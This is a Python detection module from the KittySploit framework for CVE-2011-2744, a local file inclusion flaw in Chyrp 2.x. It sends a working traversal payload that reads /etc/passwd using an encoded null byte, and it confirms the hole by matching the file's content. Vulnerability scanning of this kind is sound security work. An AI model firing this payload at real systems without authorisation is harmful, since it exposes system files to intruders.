#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""A directory traversal vulnerability in Chyrp 2."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Chyrp 2.x - Local File Inclusion Detection',
        'description': 'A directory traversal vulnerability in Chyrp 2.1 and earlier allows remote attackers to include and execute arbitrary local files via a ..%2F (encoded dot dot slash) in the action parameter to the default URI.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2011', 'lfi', 'chyrp', 'edb', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://www.exploit-db.com/exploits/35945',
            'http://www.openwall.com/lists/oss-security/2011/07/13/6',
            'https://nvd.nist.gov/vuln/detail/CVE-2011-2744',
            'http://securityreason.com/securityalert/8312',
            'http://www.ocert.org/advisories/ocert-2011-001.html',
        ],
        'cve': 'CVE-2011-2744',
    }

    def run(self):
        r = self.http_request(method="GET", path='/?action=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_regexes = ('root:.*:0:0:',)
        if (any(re.search(rx, body, 0) for rx in body_regexes)):
            self.set_info(
                severity='medium',
                reason="Chyrp 2.x - Local File Inclusion detected",
                path='/?action=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00',
            )
            return True
        return False

